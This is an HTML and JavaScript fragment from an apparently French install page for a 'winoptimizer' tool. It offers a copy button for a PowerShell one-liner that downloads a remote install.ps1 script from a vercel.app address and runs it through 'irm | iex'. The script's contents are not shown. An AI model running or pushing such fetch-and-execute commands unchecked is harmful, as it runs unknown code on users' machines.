                Copier

        <code id="command">
            <span class="ps">PS&gt;</span>
            irm <span class="url">https://winoptimizer-powershell.vercel.app/install.ps1</span> | iex
        </code>

    </div>

</div>

<script>
function copyCommand(btn) {
    const text = "irm https://winoptimizer-powershell.vercel.app/install.ps1 | iex";

    navigator.clipboard.writeText(text);

    btn.textContent = "Copié !";
    btn.classList.add("copied");

    setTimeout(() => {
        btn.textContent = "Copier";
        btn.classList.remove("copied");
    }, 2000);
}
</script>
